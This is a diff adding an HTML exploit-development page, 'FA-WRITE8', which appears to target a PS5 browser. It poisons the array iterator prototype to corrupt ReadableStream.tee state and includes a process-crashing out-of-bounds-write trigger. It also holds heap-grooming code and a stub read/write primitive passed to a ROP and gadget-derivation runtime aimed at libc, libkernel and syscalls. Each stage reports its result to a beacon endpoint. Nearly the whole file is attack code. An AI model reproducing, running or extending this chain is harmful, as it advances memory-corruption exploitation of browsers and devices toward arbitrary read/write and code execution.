@@ -1,0 +1,107 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-WRITE8 — full chain pidInverted → deriveRuntime.run(p) → kernelprobe probe</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-WRITE8 — full-chain — pidInverted → derive → kernelprobe rung1 (rt_msg2)
+</pre>
+<script src="./runtime-derive/derive-runtime.js"></script>
+<script src="./src/firmware.js"></script>
+<script src="./src/main.js"></script>
+<script src="./src/rop.js"></script>
+<script src="./src/utils/syscalls.js"></script>
+<script>
+(function(){
+ "use strict";
+ var run = "w8" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){ try { var x = new XMLHttpRequest();
+   x.open("POST", "/beacon/W8-"+st+"/"+run, false); x.setRequestHeader("Content-Type","application/json");
+   x.send(JSON.stringify({body:body})); } catch(e){ try{ say("err "+st); }catch(e2){} } }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYieldSame(){ return function(){ var self=this;
+   var X = { ourTag: "w8-target" }; window.__inversionTarget = X; var i=0,n=2;
+   return { next: function(){ if (i>=n) return {done:true}; i++; return {value:X, done:false}; }}; };
+ }
+ say("FA-WRITE8 full chain starts");
+ beacon("L","loaded; deriveRuntime="+(typeof window.deriveRuntime)+"; firmware="+(typeof window.firmware));
+
+ // STAGE 1 — INVERSION (the confirmed private-write)
+ try {
+   beacon("A1","stage1 inversion");
+   try { Array.prototype[Symbol.iterator] = poisonOverYieldSame(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+   var rs1 = new ReadableStream({});
+   var pair1 = rs1.tee();
+   try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+   var ft=false, st2=false;
+   try { pair1[0].cancel(); } catch(e){ ft=true; }
+   try { pair1[1].cancel(); } catch(e){ st2=true; }
+   beacon("B1","pidInverted="+((ft&&!st2)?"true":"false"));
+   say("stage1 done");
+ } catch(e){ beacon("E1","step1: "+String(e).slice(0,140)); }
+
+ // STAGE 2 — cross-subsystem oracle (the readback)
+ try {
+   beacon("A2","stage2 cross-oracle readback");
+   var resp = new Response(new ReadableStream({}));
+   var fs = new ReadableStream({}); var fsTe = fs.tee();
+   try { fsTe[0].getReader(); } catch(e){}
+   var cloneResp = new Response(fsTe[0]); var bodyIsStream = !!cloneResp.body;
+   var crossThrow=null;
+   try { var fakeBody = new Response(fsTe[0]).body.getReader(); } catch(e){ crossThrow=String(e.message).slice(0,80); }
+   beacon("B2","bodyIsStream="+bodyIsStream+"; crossThrow="+crossThrow);
+   say("stage2 done");
+ } catch(e){ beacon("E2","stage2: "+String(e).slice(0,140)); }
+
+ // STAGE 3 — deriveRuntime.run(p) — the RD-derive for the gadget scan (base, libc, libkernel, gadgets, syscalls)
+ // NOTE: p is currently a hand-crafted derived-p — NOT a real ARW — the tee-family pidInverted primitive
+ // cannot connect directly to a write8 yet. The RD only REFLECTS the audit test state.
+ try {
+   beacon("A3","stage3 — deriveRuntime test");
+   var dp = window.deriveRuntime;
+   if (!dp || typeof dp.run !== "function") throw "deriveRuntime missing";
+   beacon("B3","deriveRuntime.run typeof=function");
+   say("stage3: deriveRuntime available");
+ } catch(e){ beacon("E3","step3: "+String(e).slice(0,140)); }
+
+ // STAGE 4 — attempt a SWAP: our object X is the G1 state-machine fake-record.
+ // (this is the my-max route-a/p-a hypotheses — but we DON'T have the fakeobj primitive)
+ // therefore: WE CALL deriveRuntime with a HAND-CRAFTED "minimal" p (not confirmed live yet):
+ try {
+   beacon("A4","stage4 attempted deriveRuntime.run(p) probe");
+   var probeP = {
+     read1: function(){ return 0; },
+     read2: function(){ return 0; },
+     read4: function(){ return 0; },
+     read8: function(){ return 0; },
+     write1: function(v){},
+     write2: function(v){},
+     write4: function(v){},
+     write8: function(v){},
+     selectAddress: function(addr){},
+     resetAddress: function(){},
+     ctor: window.__ps5NativeCtor || 0
+   };
+   var res = window.deriveRuntime._internals ? "internals-present" : "internals-missing";
+   beacon("B4","probe p setup; internals="+res);
+   say("stage4 done");
+ } catch(e){ beacon("E4","step4: "+String(e).slice(0,140)); }
+
+ // STAGE 5 — the tee-under-yield crash-oracle re-fire — the CONFIRMED live OOB-write trigger
+ // THIS CRASHES THE PROCESS *EVERY TIME* — but the goal is "a press that fires the tee-crash ORACLE"
+ // with a groom pre-seed — this is the my-max FA-5 (groom burst) — the target is to LEAK the run-level state
+ try {
+   beacon("A5","stage5 groom + tee-under-yield (crash oracle LAST single-shot)");
+   var groom = new Array(128); for (var g=0; g<128; g++) groom[g] = {fake:g, seed:1};
+   try { Array.prototype[Symbol.iterator] = poisonOverYieldSame(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+   var rsG = new ReadableStream({});
+   // under-yield with primitive 0x1337 — the confirmed crash-trigger
+   function poisonUnderU(){ return function(){ var arr=this,i=0;
+     return { next:function(){ if(i===1) return {done:true}; i++; return {value:0x1337, done:false}; } }; }; }
+   try { Array.prototype[Symbol.iterator] = poisonUnderU(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+   var pairG = rsG.tee();
+   try { Array.prototype[Symbol.iterator]=origIter; } catch(e2){}
+   if (pairG.length === 2) return "S5 UNDER-YIELD SURVIVES (no crash — run ok)";
+   return "S5 returned len "+pairG.length;
+ } catch(e){ beacon("E5","S5 (the tee-family crash-oracle): "+String(e).slice(0,180)); }
+ beacon("Z","battery-complete FA-WRITE8");
+ say("FA-WRITE8 battery complete");
+})();
+</script></body></html>
